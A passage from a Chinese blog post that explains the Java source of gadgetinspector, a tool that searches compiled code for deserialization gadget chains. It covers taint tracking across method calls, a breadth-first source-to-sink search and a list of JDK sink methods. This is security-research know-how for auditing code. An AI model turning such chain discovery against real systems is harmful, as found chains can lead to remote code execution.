根据描述符得出被调用方法的参数类型（占用空间大小）</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非静态方法的第一个参数是对象本身，即 this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;   <span class="comment">// 非静态方法的第一个参数是实例</span></span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// 对象类型</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// 调用静态方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// 调用实例方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// 调用超类构造方法，实例初始化方法，私有方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// 调用接口方法</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 被调用方法的操作数栈</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="comment">// 最右边的参数，就是最后入栈，即在栈顶</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> argTypes.length - <span class="number">1</span> - i; <span class="comment">// 参数索引</span></span><br><span class="line">                <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> argTypes[argIndex]; <span class="comment">// 参数类型</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 参数从右往左入栈，因此最右边的参数在栈底</span></span><br><span class="line">                Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果存在能够传递污染的参数</span></span><br><span class="line">                    <span class="comment">// 遍历参数</span></span><br><span class="line">                    <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;arg&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid taint arg: &quot;</span> + argSrc);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// arg数字.字段名称</span></span><br><span class="line">                        <span class="type">int</span> <span class="variable">dotIndex</span> <span class="operator">=</span> argSrc.indexOf(<span class="string">&#x27;.&#x27;</span>); <span class="comment">// 分隔位置</span></span><br><span class="line">                        <span class="type">int</span> srcArgIndex;    <span class="comment">// 第几个参数</span></span><br><span class="line">                        String srcArgPath;</span><br><span class="line">                        <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                            srcArgPath = <span class="literal">null</span>;  <span class="comment">// 没有名称</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                            srcArgPath = argSrc.substring(dotIndex + <span class="number">1</span>);  <span class="comment">// 字段名称</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 记录参数流动关系</span></span><br><span class="line">                        <span class="comment">// argIndex：当前方法参数索引；srcArgIndex：对应上一级方法的参数索引</span></span><br><span class="line">                        discoveredCalls.add(<span class="keyword">new</span> <span class="title class_">GraphCall</span>(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="built_in">this</span>.owner), <span class="built_in">this</span>.name, <span class="built_in">this</span>.desc),</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc),</span><br><span class="line">                                srcArgIndex,</span><br><span class="line">                                srcArgPath,</span><br><span class="line">                                argIndex));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 往左一个参数</span></span><br><span class="line">                stackIndex += type.getSize();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitMethodInsn 执行出/入栈操作</span></span><br><span class="line">    <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> 方法存储分析得到的调用关系信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用工厂方法存储调用关系信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">GraphCall</span>.Factory(), discoveredCalls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-GadgetChainDiscovery"><a href="#8-GadgetChainDiscovery" class="headerlink" title="8. GadgetChainDiscovery"></a>8. GadgetChainDiscovery</h2><p>针对不同的挖掘类型，污点源信息收集的实现不同，这里关注 Java 原生序列化的污点源，分析已经在 <strong>0x02 项目结构 - gadgetinspector&#x2F;javaserial - SimpleSourceDiscovery</strong> 一节中给出。</p><p>挖掘利用链实际就是找一条从 source 点到 sink 点的路径，前面收集的信息都是为了这里的搜索做准备。</p><p>这里定义了两个类分别表示利用链和利用链上的的节点（即方法）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用链</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">GadgetChain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;GadgetChainLink&gt; links;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GadgetChain</span><span class="params">(List&lt;GadgetChainLink&gt; links)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GadgetChain</span><span class="params">(GadgetChain gadgetChain, GadgetChainLink link)</span> &#123;</span><br><span class="line">        List&lt;GadgetChainLink&gt; links = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;GadgetChainLink&gt;(gadgetChain.links);</span><br><span class="line">        links.add(link);</span><br><span class="line">        <span class="built_in">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用链（节点）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">GadgetChainLink</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle method;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> taintedArgIndex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GadgetChainLink</span><span class="params">(MethodReference.Handle method, <span class="type">int</span> taintedArgIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.method = method;</span><br><span class="line">        <span class="built_in">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">GadgetChainLink</span> <span class="variable">that</span> <span class="operator">=</span> (GadgetChainLink) o;</span><br><span class="line">        <span class="keyword">if</span> (taintedArgIndex != that.taintedArgIndex) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> method != <span class="literal">null</span> ? method.equals(that.method) : that.method == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> method != <span class="literal">null</span> ? method.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + taintedArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> 方法首先加载方法信息、继承信息，调用 <code>InheritanceDeriver.getAllMethodImplementations</code> 获取方法的重写信息，分析也已经在 <strong>0x02 项目结构</strong> 一节中给出，并保存到文件中，再加载上一步得到的调用关系信息。</p><p>然后加载污点源信息，将每个 source 方法作为初始节点创建一条链，加入待分析的链集合。遍历集合中的链，取出链并从尾节点（方法）开始分析，第一次分析污点源，如果其参数索引与被调方法的参数索引相同，则创建新节点并加入链的最末端，如果被调方法不是 sink 点，则加入待分析的链集合，否则加入发现的利用链集合。之后重复上面的步骤，集合中待分析的链会越来越长，直到所有链都被弹出和分析完毕。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 搜索可能的利用链，保存到 gadget-chains.txt 中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 加载方法信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// 加载继承信息（inheritanceMap：子类-&gt;父类集合，subClassMap：父类-&gt;子类集合）</span></span><br><span class="line">    <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">    <span class="comment">// 加载重写信息：方法-&gt;重写方法集合</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">            inheritanceMap, methodMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回目标方法的可序列化重写方法（包括目标方法本身）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ImplementationFinder</span> <span class="variable">implementationFinder</span> <span class="operator">=</span> config.getImplementationFinder(</span><br><span class="line">            methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存重写信息到 methodimpl.dat：（缩进）类名 方法名 描述符</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newBufferedWriter(Paths.get(<span class="string">&quot;methodimpl.dat&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">            writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getName());</span><br><span class="line">            writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            writer.write(entry.getKey().getDesc());</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(method.getDesc());</span><br><span class="line">                writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载调用关系信息</span></span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">GraphCall</span>.Factory())) &#123;</span><br><span class="line">        MethodReference.<span class="type">Handle</span> <span class="variable">caller</span> <span class="operator">=</span> graphCall.getCallerMethod();</span><br><span class="line">        <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">            Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            graphCalls.add(graphCall);</span><br><span class="line">            graphCallMap.put(caller, graphCalls);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            graphCallMap.get(caller).add(graphCall);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经访问过的方法（节点）</span></span><br><span class="line">    Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 待分析的链</span></span><br><span class="line">    LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 加载所有 sources，并将每个 source 分别作为链的第一个节点</span></span><br><span class="line">    <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">Source</span>.Factory())) &#123;</span><br><span class="line">        <span class="comment">// 创建节点</span></span><br><span class="line">        <span class="type">GadgetChainLink</span> <span class="variable">srcLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">        <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建仅有一个节点的链</span></span><br><span class="line">        methodsToExplore.add(<span class="keyword">new</span> <span class="title class_">GadgetChain</span>(Arrays.asList(srcLink)));</span><br><span class="line">        <span class="comment">// 将方法标记为已访问</span></span><br><span class="line">        exploredMethods.add(srcLink);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环次数</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">iteration</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 保存找到的利用链</span></span><br><span class="line">    Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// BFS 搜索 source 到 sink 的利用链</span></span><br><span class="line">    <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Iteration &quot;</span> + iteration + <span class="string">&quot;, Search space: &quot;</span> + methodsToExplore.size());</span><br><span class="line">        &#125;</span><br><span class="line">        iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">GadgetChain</span> <span class="variable">chain</span> <span class="operator">=</span> methodsToExplore.pop(); <span class="comment">// 取出一条链</span></span><br><span class="line">        <span class="type">GadgetChainLink</span> <span class="variable">lastLink</span> <span class="operator">=</span> chain.links.get(chain.links.size() - <span class="number">1</span>); <span class="comment">// 取这条链最后一个节点（方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前方法与其被调方法的调用关系</span></span><br><span class="line">        Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);</span><br><span class="line">        <span class="keyword">if</span> (methodCalls != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                <span class="comment">// 如果当前方法的污染参数与被调方法受方法参数影响的索引不一致则跳过（即第 index 个参数）</span></span><br><span class="line">                <span class="comment">// 判断 source 时，索引指出能够被攻击者控制的参数</span></span><br><span class="line">                <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 获取被调方法的可序列化重写信息</span></span><br><span class="line">                Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 遍历被调方法的重写方法</span></span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                    <span class="type">GadgetChainLink</span> <span class="variable">newLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(methodImpl, graphCall.getTargetArgIndex());</span><br><span class="line">                    <span class="comment">// 如果被调方法已经被访问过了，则跳过，减少开销</span></span><br><span class="line">                    <span class="comment">// 但是跳过会使其他链在经过此节点时断掉</span></span><br><span class="line">                    <span class="comment">// 而去掉这步可能会遇到环状问题，造成路径无限增加</span></span><br><span class="line">                    <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 新节点（被调方法）与之前的链组成新链</span></span><br><span class="line">                    <span class="type">GadgetChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChain</span>(chain, newLink);</span><br><span class="line">                    <span class="comment">// 判断被调方法是否为 sink 点，如果是则加入利用链集合</span></span><br><span class="line">                    <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;</span><br><span class="line">                        discoveredGadgets.add(newChain);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 否则将新链加入待分析的链集合，被调方法加入已访问的方法集合</span></span><br><span class="line">                        methodsToExplore.add(newChain);</span><br><span class="line">                        exploredMethods.add(newLink);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将搜索到的利用链保存到 gadget-chains.txt</span></span><br><span class="line">    <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> Files.newOutputStream(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">         <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">            printGadgetChain(writer, chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Found &#123;&#125; gadget chains.&quot;</span>, discoveredGadgets.size());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSink</code> 方法判断方法（和参数）是否触发预定义的 JDK 中的 sink 点，比如 <code>Runtime.exec</code> 方法。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 预定义的 sink 点</span></span><br><span class="line"><span class="comment"> * Represents a collection of methods in the JDK that we consider to be &quot;interesting&quot;. If a gadget chain can</span></span><br><span class="line"><span class="comment"> * successfully exercise one of these, it could represent anything as mundade as causing the target to make a DNS</span></span><br><span class="line"><span class="comment"> * query to full blown RCE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method            方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> argIndex          参数索引</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inheritanceMap    继承信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Parameterize this as a configuration option</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isSink</span><span class="params">(MethodReference.Handle method, <span class="type">int</span> argIndex, InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileInputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileOutputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span 